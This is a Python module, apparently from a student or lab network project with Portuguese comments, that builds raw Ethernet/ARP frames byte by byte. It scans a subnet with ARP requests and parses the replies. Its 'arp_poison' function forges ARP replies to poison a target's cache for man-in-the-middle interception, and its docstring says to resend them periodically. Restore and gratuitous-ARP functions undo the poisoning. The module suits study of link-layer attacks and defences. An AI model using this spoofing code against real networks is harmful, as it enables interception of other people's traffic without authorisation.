"""
arp.py — Camada de ENLACE: construção, envio e parsing manual de quadros ARP.

Responsabilidades:
  * Montar ARP Requests (varredura/descoberta de hosts);
  * Montar ARP Replies forjados (envenenamento de cache);
  * Montar ARP Replies legítimos (auto-cura / self-healing);
  * Fazer o parsing de respostas ARP recebidas.

Nada aqui usa Scapy ou libpcap: montamos os 42 bytes do quadro
(14 de Ethernet + 28 de ARP) byte a byte com `struct`, e enviamos por um
raw socket AF_PACKET aberto na camada de enlace.

Formato do quadro (ARP sobre Ethernet/IPv4) — ver Tabela 3 do guia:
  Ethernet (14 B): dst(6) + src(6) + ethertype(2)=0x0806
  ARP (28 B):
     HTYPE(2)=1  PTYPE(2)=0x0800  HLEN(1)=6  PLEN(1)=4  OPER(2)
     SHA(6) SPA(4) THA(6) TPA(4)
"""

import socket
import struct
import time

ETH_P_ARP = 0x0806
ARP_REQUEST = 1
ARP_REPLY = 2
BROADCAST = b"\xff\xff\xff\xff\xff\xff"
ZERO_MAC = b"\x00\x00\x00\x00\x00\x00"


def build_arp(eth_dst: bytes, eth_src: bytes, oper: int,
              sha: bytes, spa: str, tha: bytes, tpa: str) -> bytes:
    """
    Monta um quadro Ethernet+ARP completo.
      eth_dst/eth_src : MACs do cabeçalho Ethernet (6 bytes cada)
      oper            : 1=Request, 2=Reply
      sha/spa         : Sender Hardware/Protocol Address (MAC/IP de origem ARP)
      tha/tpa         : Target Hardware/Protocol Address (MAC/IP alvo ARP)
    """
    eth = eth_dst + eth_src + struct.pack("!H", ETH_P_ARP)
    arp = struct.pack("!HHBBH", 1, 0x0800, 6, 4, oper)
    arp += sha + socket.inet_aton(spa)
    arp += tha + socket.inet_aton(tpa)
    return eth + arp


def arp_request(my_mac: bytes, my_ip: str, target_ip: str) -> bytes:
    """ARP Request em broadcast: 'quem tem o IP target_ip?'."""
    return build_arp(
        eth_dst=BROADCAST, eth_src=my_mac, oper=ARP_REQUEST,
        sha=my_mac, spa=my_ip, tha=ZERO_MAC, tpa=target_ip,
    )


def arp_poison(target_ip: str, target_mac: bytes, spoof_ip: str,
               my_mac: bytes) -> bytes:
    """
    ARP Reply FORJADO: convence `target` de que `spoof_ip` está no MEU MAC.
    Enviado ao MAC real do alvo (unicast). Reenviar periodicamente.
    """
    return build_arp(
        eth_dst=target_mac, eth_src=my_mac, oper=ARP_REPLY,
        sha=my_mac, spa=spoof_ip, tha=target_mac, tpa=target_ip,
    )


def arp_restore(target_ip: str, target_mac: bytes, real_ip: str,
                real_mac: bytes) -> bytes:
    """
    ARP Reply LEGÍTIMO (auto-cura): diz ao `target` o MAC verdadeiro de
    `real_ip`. Usado nas rajadas corretivas ao encerrar.
    """
    return build_arp(
        eth_dst=target_mac, eth_src=real_mac, oper=ARP_REPLY,
        sha=real_mac, spa=real_ip, tha=target_mac, tpa=target_ip,
    )


def arp_announce(real_ip: str, real_mac: bytes) -> bytes:
    """
    ARP gratuito de ANÚNCIO (gratuitous ARP Request em broadcast):
    'quem tem real_ip? diga a real_ip', com SHA=real_mac e SPA=TPA=real_ip.

    É o mesmo mecanismo que um SO usa ao subir uma interface. Diferente de um
    Reply não solicitado, um Request é processado de forma confiável pelos
    hosts, que ATUALIZAM a entrada existente do remetente — por isso é a forma
    mais robusta de corrigir caches já envenenadas (mesmo em estado REACHABLE)
    durante a auto-cura.
    """
    return build_arp(
        eth_dst=BROADCAST, eth_src=real_mac, oper=ARP_REQUEST,
        sha=real_mac, spa=real_ip, tha=ZERO_MAC, tpa=real_ip,
    )


def parse_arp_reply(frame: bytes):
    """
    Faz o parsing de um quadro recebido e, se for um ARP Reply, devolve
    (ip_origem, mac_origem). Caso contrário devolve None.
    """
    if len(frame) < 42:
        return None
    ethertype = struct.unpack("!H", frame[12:14])[0]
    if ethertype != ETH_P_ARP:
        return None
    oper = struct.unpack("!H", frame[20:22])[0]
    if oper != ARP_REPLY:
        return None
    sha = frame[22:28]
    spa = socket.inet_ntoa(frame[28:32])
    return spa, sha


class ArpScanner:
    """Varredura ARP: envia Requests para toda a sub-rede e coleta Replies."""

    def __init__(self, sock: socket.socket, my_mac: bytes, my_ip: str):
        self.sock = sock
        self.my_mac = my_mac
        self.my_ip = my_ip
        self.found = {}  # ip -> mac(bytes)

    def send_requests(self, target_ips):
        """Dispara um ARP Request para cada IP alvo."""
        for ip in target_ips:
            if ip == self.my_ip:
                continue
            try:
                self.sock.send(arp_request(self.my_mac, self.my_ip, ip))
            except OSError:
                pass
            time.sleep(0.002)  # evita estourar o buffer de envio

    def collect(self, duration: float = 3.0):
        """
        Escuta respostas ARP por `duration` segundos, preenchendo self.found.
        Usa timeout curto para não bloquear indefinidamente.
        """
        self.sock.settimeout(0.5)
        end = time.time() + duration
        while time.time() < end:
            try:
                frame = self.sock.recv(65535)
            except socket.timeout:
                continue
            except OSError:
                break
            res = parse_arp_reply(frame)
            if res:
                ip, mac = res
                self.found[ip] = mac
        self.sock.settimeout(None)
        return self.found
